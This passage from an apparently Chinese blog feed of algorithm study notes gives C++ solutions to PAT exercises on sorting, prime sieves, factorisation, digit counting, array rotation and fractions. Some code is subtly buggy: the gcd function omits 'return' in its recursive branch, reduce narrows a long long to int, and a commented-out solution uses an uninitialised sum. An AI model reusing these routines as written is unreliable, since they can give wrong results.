class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//build heap</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n/<span class="number">2</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        downjust(i,n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=n&amp;&amp;same(heap,changed,n)) flag=<span class="literal">true</span>;</span><br><span class="line">        swap(heap[<span class="number">1</span>],heap[i]);</span><br><span class="line">        downjust(<span class="number">1</span>,i<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="literal">true</span>)&#123;</span><br><span class="line">            show(heap,n);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;heap[i]);</span><br><span class="line">        insert2[i]=heap[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;changed[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//insert sort</span></span><br><span class="line">    <span class="keyword">if</span>(insert_sort(insert2,changed,n))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Insertion Sort\n&quot;</span>);</span><br><span class="line">        show(insert2,n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//heap sort</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Heap Sort\n&quot;</span>);</span><br><span class="line">        heap_sort(heap,n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第五章</title>
    <url>/2020/02/04/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%BA%94%E7%AB%A0/</url>
    <content><![CDATA[<p>第五章书上的题目+Codeup+上机训练</p>
<span id="more"></span>

<h2 id="5-书"><a href="#5-书" class="headerlink" title="5(书)"></a>5(书)</h2><h3 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1019</span></span><br><span class="line"><span class="keyword">int</span> num[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_array</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> num[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        num[i]=n%<span class="number">10</span>;   <span class="comment">//低位存放低位</span></span><br><span class="line">        n/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">to_num</span><span class="params">(<span class="keyword">int</span> num[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        result=result*<span class="number">10</span>+num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,MIN,MAX;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        to_array(n,num);</span><br><span class="line">        sort(num,num+<span class="number">4</span>);</span><br><span class="line">        MIN=to_num(num);</span><br><span class="line">        sort(num,num+<span class="number">4</span>,cmp);  <span class="comment">//increasing</span></span><br><span class="line">        MAX=to_num(num);</span><br><span class="line">        n=MAX-MIN;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%04d - %04d = %04d\n&quot;</span>,MAX,MIN,n);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">6174</span>||n==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-4"><a href="#5-4" class="headerlink" title="5.4"></a>5.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1013</span></span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">1000001</span>];</span><br><span class="line"><span class="keyword">bool</span> p[<span class="number">1000001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> pnum=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FindPrime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;<span class="number">1000001</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p[i]==<span class="literal">false</span>)&#123;</span><br><span class="line">            prime[pnum++]=i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i*<span class="number">2</span>;j&lt;<span class="number">1000001</span>;j+=i)&#123;</span><br><span class="line">                p[j]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N,M;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;M);</span><br><span class="line">    FindPrime();</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=N;i&lt;=M;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,prime[i<span class="number">-1</span>]);</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;M &amp;&amp; count%<span class="number">10</span>!=<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(count%<span class="number">10</span>==<span class="number">0</span> &amp;&amp; i&lt;M) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-5"><a href="#5-5" class="headerlink" title="5.5"></a>5.5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1059</span></span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">bool</span> p[<span class="number">100001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> pnum=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FindPrime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;<span class="number">100001</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p[i]==<span class="literal">false</span>)&#123;</span><br><span class="line">            prime[pnum++]=i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i*<span class="number">2</span>;j&lt;<span class="number">100001</span>;j+=i)&#123;</span><br><span class="line">                p[j]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">factor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,cnt;</span><br><span class="line">&#125;fac[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FindPrime();</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;1=1&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d=&quot;</span>,n);</span><br><span class="line">        <span class="keyword">int</span> sqr=(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(<span class="number">1.0</span>*n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pnum&amp;&amp;prime[i]&lt;=sqr;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n%prime[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                fac[num].x=prime[i];</span><br><span class="line">                fac[num].cnt=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(n%prime[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                    fac[num].cnt++;</span><br><span class="line">                    n/=prime[i];</span><br><span class="line">                &#125;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n!=<span class="number">1</span>)&#123;</span><br><span class="line">            fac[num].x=n;</span><br><span class="line">            fac[num++].cnt=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,fac[i].x);</span><br><span class="line">            <span class="keyword">if</span>(fac[i].cnt&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;^%d&quot;</span>,fac[i].cnt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-上机"><a href="#5-上机" class="headerlink" title="5(上机)"></a>5(上机)</h2><h3 id="5-1-1"><a href="#5-1-1" class="headerlink" title="5.1"></a>5.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1049</span></span><br><span class="line"><span class="comment">//这题对数学要求很高，自己推一编，然后先记住结论就好</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> now,left,right;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n/idx!=<span class="number">0</span>)&#123;</span><br><span class="line">        left=n/(idx*<span class="number">10</span>);</span><br><span class="line">        now=n/idx%<span class="number">10</span>;</span><br><span class="line">        right=n%idx;</span><br><span class="line">        <span class="keyword">if</span>(now==<span class="number">0</span>)&#123;</span><br><span class="line">            ans+=left*idx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(now==<span class="number">1</span>)&#123;</span><br><span class="line">            ans+=left*idx+right+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=(left+<span class="number">1</span>)*idx;</span><br><span class="line">        &#125;</span><br><span class="line">        idx*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1008</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    int ans=0,temp,last=0;</span></span><br><span class="line"><span class="comment">    while(N--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;temp);</span></span><br><span class="line"><span class="comment">        if(temp&gt;last)&#123;</span></span><br><span class="line"><span class="comment">            ans+=(temp-last)*6;</span></span><br><span class="line"><span class="comment">            ans+=5;</span></span><br><span class="line"><span class="comment">            last=temp;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(temp&lt;last)&#123;</span></span><br><span class="line"><span class="comment">            ans+=(last-temp)*4;</span></span><br><span class="line"><span class="comment">            ans+=5;</span></span><br><span class="line"><span class="comment">            last=temp;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            ans+=5;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,ans);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1003</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">    while(n--)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        char s[105];</span></span><br><span class="line"><span class="comment">        int cnt_p = 0, cnt_t = 0, other = 0;</span></span><br><span class="line"><span class="comment">        int flag_p, flag_t;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s&quot;,s);</span></span><br><span class="line"><span class="comment">        int len = strlen(s);</span></span><br><span class="line"><span class="comment">        for(int i = 0; i &lt; len; i++)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            if(s[i] == &#x27;P&#x27;)</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                cnt_p++;    //记录P的个数</span></span><br><span class="line"><span class="comment">                flag_p = i;   //标记P位置</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else if(s[i] == &#x27;T&#x27;)</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                cnt_t++;    //记录T的个数</span></span><br><span class="line"><span class="comment">                flag_t = i;   //标记T位置</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else if(s[i] != &#x27;A&#x27;)&#123;</span></span><br><span class="line"><span class="comment">                other++;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if((cnt_p != 1) || (cnt_t != 1) || other || (flag_t - flag_p &lt;= 1))</span></span><br><span class="line"><span class="comment">            printf(&quot;NO\n&quot;);</span></span><br><span class="line"><span class="comment">        else if(flag_p * (flag_t-flag_p-1) == len - flag_t - 1)</span></span><br><span class="line"><span class="comment">            printf(&quot;YES\n&quot;);</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            printf(&quot;NO\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1049</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">    double ans,temp;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%lf&quot;,&amp;temp);</span></span><br><span class="line"><span class="comment">        ans+=temp*i*(n+1-i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%.2f&quot;,ans);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-2"><a href="#5-2" class="headerlink" title="5.2"></a>5.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//const int CLK_TCK=100;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1008</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N=<span class="number">0</span>,M=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> A[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;M);</span><br><span class="line">    M=M%N;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=N-M;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,A[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N-M<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,A[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,A[N-M<span class="number">-1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-3"><a href="#5-3" class="headerlink" title="5.3"></a>5.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1034</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fraction</span>&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> up,down;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">gcd</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a,<span class="keyword">long</span> <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        gcd(b,a%b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">reduce</span><span class="params">(Fraction a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.up==<span class="number">0</span>) a.down=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=gcd(<span class="built_in">abs</span>(a.up),<span class="built_in">abs</span>(a.down));</span><br><span class="line">        a.up/=temp;</span><br><span class="line">        a.down/=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">add</span><span class="params">(Fraction a,Fraction b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up=a.up*b.down+b.up*a.down;</span><br><span class="line">    result.down=a.down*b.down;</span><br><span class="line">    <span class="keyword">return</span> reduce(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">sub</span><span class="params">(Fraction a,Fraction b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up=a.up*b.down-b.up*a.down;</span><br><span class="line">    result.down=a.down*b.down;</span><br><span class="line">    <span class="keyword">return</span> reduce(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">multiply</span><span class="params">(Fraction a,Fraction b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up=a.up*b.up;</span><br><span class="line">    result.down=a.down*b.down;</span><br><span class="line">    <span class="keyword">return</span> reduce(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">divide</span><span class="params">(Fraction a,Fraction b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up=a.up*b.down;</span><br><span class="line">    result.down=a.down*b.up;</span><br><span class="line">    <span class="keyword">if</span>(result.down&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        result.down=-result.down;</span><br><span class="line">        